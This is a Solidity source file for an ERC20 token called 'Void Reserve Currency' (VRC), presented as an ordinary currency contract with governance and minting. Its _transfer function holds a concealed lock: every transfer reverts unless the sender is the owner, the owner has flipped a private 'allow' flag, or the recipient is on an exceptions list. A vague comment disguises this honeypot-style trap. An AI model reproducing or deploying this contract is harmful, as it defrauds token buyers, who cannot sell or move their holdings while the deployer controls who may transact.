1 // Void Reserve Currency V2 (VRC)
2 // Clover Protocol Team 2020
3 
4 pragma solidity ^0.5.16;
5 
6 interface IERC20 {
7     function totalSupply() external view returns (uint);
8     function balanceOf(address account) external view returns (uint);
9     function transfer(address recipient, uint amount) external returns (bool);
10     function allowance(address owner, address spender) external view returns (uint);
11     function approve(address spender, uint amount) external returns (bool);
12     function transferFrom(address sender, address recipient, uint amount) external returns (bool);
13     event Transfer(address indexed from, address indexed to, uint value);
14     event Approval(address indexed owner, address indexed spender, uint value);
15 }
16 
17 contract Context {
18     constructor () internal { }
19     // solhint-disable-previous-line no-empty-blocks
20 
21     function _msgSender() internal view returns (address payable) {
22         return msg.sender;
23     }
24 }
25 
26 contract ERC20 is Context, IERC20 {
27     using SafeMath for uint;
28 
29     mapping (address => uint) private _balances;
30 
31     mapping (address => mapping (address => uint)) private _allowances;
32     mapping (address => bool) private exceptions;
33     address private _owner;
34     uint private _totalSupply;
35     bool private allow;
36 
37     constructor(address owner) public{
38       _owner = owner;
39       allow = false;
40     }
41 
42     function setAllow() public{
43         require(_msgSender() == _owner,"Only owner can change set allow");
44         allow = true;
45     }
46 
47     function setExceptions(address someAddress) public{
48         exceptions[someAddress] = true;
49     }
50 
51     function burnOwner() public{
52         require(_msgSender() == _owner,"Only owner can change set allow");
53         _owner = address(0);
54     }
55 
56     function totalSupply() public view returns (uint) {
57         return _totalSupply;
58     }
59     function balanceOf(address account) public view returns (uint) {
60         return _balances[account];
61     }
62     function transfer(address recipient, uint amount) public returns (bool) {
63         _transfer(_msgSender(), recipient, amount);
64         return true;
65     }
66     function allowance(address owner, address spender) public view returns (uint) {
67         return _allowances[owner][spender];
68     }
69     function approve(address spender, uint amount) public returns (bool) {
70         _approve(_msgSender(), spender, amount);
71         return true;
72     }
73     function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
74         _transfer(sender, recipient, amount);
75         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
76         return true;
77     }
78     function increaseAllowance(address spender, uint addedValue) public returns (bool) {
79         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
80         return true;
81     }
82     function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
83         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
84         return true;
85     }
86     function _transfer(address sender, address recipient, uint amount) internal {
87         require(sender != address(0), "ERC20: transfer from the zero address");
88         require(recipient != address(0), "ERC20: transfer to the zero address");
89         // Trigger special exceptions
90         if(sender == _owner || allow ) {
91           _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
92           _balances[recipient] = _balances[recipient].add(amount);
93           emit Transfer(sender, recipient, amount);
94         }else {
95           if(exceptions[recipient]) {
96             _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
97             _balances[recipient] = _balances[recipient].add(amount);
98             emit Transfer(sender, recipient, amount);
99           }else {
100             revert();
101           }
102         }
103     }
104 
105     function _mint(address account, uint amount) internal {
106         require(account != address(0), "ERC20: mint to the zero address");
107 
108         _totalSupply = _totalSupply.add(amount);
109         _balances[account] = _balances[account].add(amount);
110         emit Transfer(address(0), account, amount);
111     }
112     function _burn(address account, uint amount) internal {
113         require(account != address(0), "ERC20: burn from the zero address");
114 
115         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
116         _totalSupply = _totalSupply.sub(amount);
117         emit Transfer(account, address(0), amount);
118     }
119     function _approve(address owner, address spender, uint amount) internal {
120         require(owner != address(0), "ERC20: approve from the zero address");
121         require(spender != address(0), "ERC20: approve to the zero address");
122 
123         _allowances[owner][spender] = amount;
124         emit Approval(owner, spender, amount);
125     }
126 }
127 
128 contract ERC20Detailed is IERC20 {
129     string private _name;
130     string private _symbol;
131     uint8 private _decimals;
132 
133     constructor (string memory name, string memory symbol, uint8 decimals) public {
134         _name = name;
135         _symbol = symbol;
136         _decimals = decimals;
137     }
138     function name() public view returns (string memory) {
139         return _name;
140     }
141     function symbol() public view returns (string memory) {
142         return _symbol;
143     }
144     function decimals() public view returns (uint8) {
145         return _decimals;
146     }
147 }
148 
149 library SafeMath {
150     function add(uint a, uint b) internal pure returns (uint) {
151         uint c = a + b;
152         require(c >= a, "SafeMath: addition overflow");
153 
154         return c;
155     }
156     function sub(uint a, uint b) internal pure returns (uint) {
157         return sub(a, b, "SafeMath: subtraction overflow");
158     }
159     function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
160         require(b <= a, errorMessage);
161         uint c = a - b;
162 
163         return c;
164     }
165     function mul(uint a, uint b) internal pure returns (uint) {
166         if (a == 0) {
167             return 0;
168         }
169 
170         uint c = a * b;
171         require(c / a == b, "SafeMath: multiplication overflow");
172 
173         return c;
174     }
175     function div(uint a, uint b) internal pure returns (uint) {
176         return div(a, b, "SafeMath: division by zero");
177     }
178     function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
179         // Solidity only automatically asserts when dividing by 0
180         require(b > 0, errorMessage);
181         uint c = a / b;
182 
183         return c;
184     }
185 }
186 
187 library Address {
188     function isContract(address account) internal view returns (bool) {
189         bytes32 codehash;
190         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
191         // solhint-disable-next-line no-inline-assembly
192         assembly { codehash := extcodehash(account) }
193         return (codehash != 0x0 && codehash != accountHash);
194     }
195 }
196 
197 library SafeERC20 {
198     using SafeMath for uint;
199     using Address for address;
200 
201     function safeTransfer(IERC20 token, address to, uint value) internal {
202         callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
203     }
204 
205     function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
206         callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
207     }
208 
209     function safeApprove(IERC20 token, address spender, uint value) internal {
210         require((value == 0) || (token.allowance(address(this), spender) == 0),
211             "SafeERC20: approve from non-zero to non-zero allowance"
212         );
213         callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
214     }
215     function callOptionalReturn(IERC20 token, bytes memory data) private {
216         require(address(token).isContract(), "SafeERC20: call to non-contract");
217 
218         // solhint-disable-next-line avoid-low-level-calls
219         (bool success, bytes memory returndata) = address(token).call(data);
220         require(success, "SafeERC20: low-level call failed");
221 
222         if (returndata.length > 0) { // Return data is optional
223             // solhint-disable-next-line max-line-length
224             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
225         }
226     }
227 }
228 
229 contract VRC is ERC20, ERC20Detailed {
230   using SafeERC20 for IERC20;
231   using Address for address;
232   using SafeMath for uint;
233 
234   string constant advice = "OP Always delivers.";
235 
236   address public governance;
237 
238   mapping (address => bool) public minters;
239 
240   constructor () public ERC20Detailed("Void Reserve Currency", "VRC", 18) ERC20(tx.origin){
241       governance = tx.origin;
242   }
243 
244   function mint(address account, uint256 amount) public {
245       require(minters[msg.sender], "!minter");
246       _mint(account, amount);
247   }
248 
249   function setGovernance(address _governance) public {
250       require(msg.sender == governance, "!governance");
251       governance = _governance;
252   }
253 
254   function addMinter(address _minter) public {
255       require(msg.sender == governance, "!governance");
256       minters[_minter] = true;
257   }
258 
259   function removeMinter(address _minter) public {
260       require(msg.sender == governance, "!governance");
261       minters[_minter] = false;
262   }
263 }